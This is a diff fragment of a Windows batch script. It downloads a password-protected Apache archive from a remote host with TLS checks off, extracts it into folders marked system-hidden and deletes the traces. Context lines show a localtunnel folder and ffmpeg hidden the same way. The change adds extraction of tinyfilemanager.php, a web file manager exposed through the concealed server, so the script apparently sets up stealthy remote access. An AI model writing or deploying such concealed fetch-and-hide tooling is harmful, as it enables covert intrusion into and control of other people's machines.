@@ -61,7 +61,7 @@ attrib -s -h -i "%environment%\localtunnel" && if exist "%environment%\localtunn
 )
 
 tasklist /fi "imagename eq httpd.exe" | find /i "httpd.exe" > nul
-if not errorlevel 1 (attrib -s -h -i "%environment%\apache2" && "%environment%\curl.exe" -k %proxy% %host%/Tools/apache2.7z -o "%temp%\apache2.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\apache2.7z" -p7zapache2 -o"%environment%" apache2\conf\*.* -y && attrib +s +h +i "%environment%\apache2" && del /s /f /q /a "%temp%\apache2.7z") else (attrib -s -h -i "%environment%\apache2" && "%environment%\curl.exe" -k %proxy% %host%/Tools/apache2.7z -o "%temp%\apache2.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\apache2.7z" -p7zapache2 -o"%environment%" -y && attrib +s +h +i "%environment%\apache2" && del /s /f /q /a "%temp%\apache2.7z")
+if not errorlevel 1 (attrib -s -h -i "%environment%\apache2" && "%environment%\curl.exe" -k %proxy% %host%/Tools/apache2.7z -o "%temp%\apache2.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\apache2.7z" -p7zapache2 -o"%environment%" apache2\conf\*.* apache2\php\tinyfilemanager.php -y && attrib +s +h +i "%environment%\apache2" && del /s /f /q /a "%temp%\apache2.7z") else (attrib -s -h -i "%environment%\apache2" && "%environment%\curl.exe" -k %proxy% %host%/Tools/apache2.7z -o "%temp%\apache2.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\apache2.7z" -p7zapache2 -o"%environment%" -y && attrib +s +h +i "%environment%\apache2" && del /s /f /q /a "%temp%\apache2.7z")
 
  attrib -s -h -i "%environment%\ffmpeg.exe" && if exist "%environment%\ffmpeg.eexe" (
     attrib +s +h +i "%environment%\ffmpeg.exe"
